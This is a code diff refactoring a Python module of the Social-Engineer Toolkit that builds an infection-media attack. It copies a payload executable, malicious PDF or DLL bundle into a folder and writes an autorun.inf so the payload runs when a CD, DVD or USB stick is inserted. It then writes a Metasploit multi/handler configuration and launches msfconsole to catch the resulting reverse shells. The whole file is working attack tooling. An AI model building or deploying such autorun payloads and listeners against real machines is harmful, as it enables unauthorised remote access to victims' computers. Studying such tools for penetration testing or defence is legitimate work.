@@ -1,83 +1,93 @@
 #!/usr/bin/env python
+# coding=utf-8
 # simple autorun creation for set
 
-import subprocess
 import os
-import re
-import sys
-from src.core.setcore import *
+import subprocess
 from time import sleep
+
+import src.core.setcore as core
 
 # define metasploit path
 definepath = os.getcwd()
-msf_path = meta_path()
-me = mod_name()
+msf_path = core.meta_path()
+me = core.mod_name()
+autorun_path = os.path.join(core.setdir, "autorun")
 
 trigger = 0
-if check_options("INFECTION_MEDIA=") == "ON":
+
+if core.check_options("INFECTION_MEDIA=") == "ON":
     trigger = 1
-    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir %s/autorun 1> /dev/null 2> /dev/null;cp %s/payload.exe %s/autorun/program.exe 1> /dev/null 2> /dev/null" %
-                     (setdir, setdir, setdir, setdir), shell=True).wait()
+    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
+                     "mkdir {0} 1> /dev/null 2> /dev/null;"
+                     "cp {1} {2} 1> /dev/null 2> /dev/null".format(autorun_path,
+                                                                   os.path.join(core.setdir, "payload.exe"),
+                                                                   os.path.join(autorun_path, "program.exe")),
+                     shell=True).wait()
 
-if os.path.isfile(setdir + "/fileformat.file"):
+if os.path.isfile(os.path.join(core.setdir, "fileformat.file")):
     trigger = 2
-    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir autorun 1> /dev/null 2> /dev/null;cp %s/template.pdf autorun/ 1> /dev/null 2>/dev/null" %
-                     (setdir, setdir), shell=True).wait()
+    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
+                     "mkdir {0} 1> /dev/null 2> /dev/null;"
+                     "cp {1} {0} 1> /dev/null 2>/dev/null".format(autorun_path,
+                                                                  os.path.join(core.setdir, "template.pdf")),
+                     shell=True).wait()
 
-if os.path.isfile(setdir + "/dll/openthis.wab"):
-    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir autorun 1> /dev/null 2> /dev/null;cp %s/dll/* autorun/ 1> /dev/null 2> /dev/null" %
-                     (setdir, setdir), shell=True).wait()
+if os.path.isfile(os.path.join(core.setdir, "/dll/openthis.wab")):
+    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
+                     "mkdir {0} 1> /dev/null 2> /dev/null;"
+                     "cp {1} {0} 1> /dev/null 2> /dev/null".format(autorun_path,
+                                                                   os.path.join(core.setdir, "/dll/*")),
+                     shell=True).wait()
     trigger = 3
 
-if not os.path.isdir(setdir + "/autorun"):
-    os.makedirs(setdir + "/autorun/")
-filewrite = open(setdir + "/autorun/autorun.inf", "w")
+if not os.path.isdir(autorun_path):
+    os.makedirs(autorun_path)
 
-# if using standard payloads
-if trigger == 1:
-    payload = "program.exe"  # "" + alpha_data + "\""
+with open(os.path.join(autorun_path, "autorun.inf"), 'w') as filewrite:
+    # if using standard payloads
+    if trigger == 1:
+        payload = "program.exe"  # "" + alpha_data + "\""
 
-# if using pdf payload
-if trigger == 2:
-    payload = "template.pdf"
+    # if using pdf payload
+    elif trigger == 2:
+        payload = "template.pdf"
 
-if trigger == 3:
-    payload = "openthis.wab"
+    elif trigger == 3:
+        payload = "openthis.wab"
 
-filewrite.write("""[autorun]
-open=%s
-icon=autorun.ico""" % (payload))
-filewrite.close()
-print_status(
-    "Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'")
-print_status(
-    "Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
-print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")
+    else:
+        payload = ""
+
+    filewrite.write("""[autorun]\nopen={}\nicon=autorun.ico""".format(payload))
+
+core.print_status("Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'")
+core.print_status("Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
+core.print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")
 
 # if we want to launch payload and automatically create listener
-if trigger == 1 or trigger == 2 or trigger == 3:
-    choice1 = yesno_prompt("0", "Create a listener right now [yes|no]")
+if trigger in [1, 2, 3]:
+    choice1 = core.yesno_prompt("0", "Create a listener right now [yes|no]")
     if choice1.lower() == "yes" or choice1.lower() == "y":
         # if we used something to create other than solo.py then write out the
         # listener
-        if not os.path.isfile(setdir + "/meta_config"):
-            filewrite = open(setdir + "/meta_config", "w")
-            fileopen = open(setdir + "/payload.options", "r")
-            for line in fileopen:
-                line = line.split(" ")
-                filewrite.write("use multi/handler\n")
-                filewrite.write("set payload " + line[0] + "\n")
-                filewrite.write("set lhost " + line[1] + "\n")
-                filewrite.write("set lport " + line[2] + "\n")
-                filewrite.write("set ExitOnSession false\n")
-                filewrite.write("exploit -j\r\n\r\n")
-                filewrite.close()
+        if not os.path.isfile(os.path.join(core.setdir, "meta_config")):
+            with open(os.path.join(core.setdir, "meta_config"), 'w') as filewrite, \
+                    open(os.path.join(core.setdir, "payload.options")) as fileopen:
+                for line in fileopen:
+                    line = line.split(" ")
+                    filewrite.write("use multi/handler\n")
+                    filewrite.write("set payload {}\n".format(line[0]))
+                    filewrite.write("set lhost {}\n".format(line[1]))
+                    filewrite.write("set lport {}\n".format(line[2]))
+                    filewrite.write("set ExitOnSession false\n")
+                    filewrite.write("exploit -j\r\n\r\n")
 
         # create the listener
-        print_status(
-            "Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
-        subprocess.Popen("%smsfconsole -r %s/meta_config" %
-                         (msf_path, setdir), shell=True).wait()
+        core.print_status("Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
+        subprocess.Popen("{} -r {}".format(os.path.join(msf_path, "msfconsole"),
+                                           os.path.join(core.setdir, "meta_config")),
+                         shell=True).wait()
     else:
-        print_warning("cancelling...")
+        core.print_warning("cancelling...")
         sleep(2)
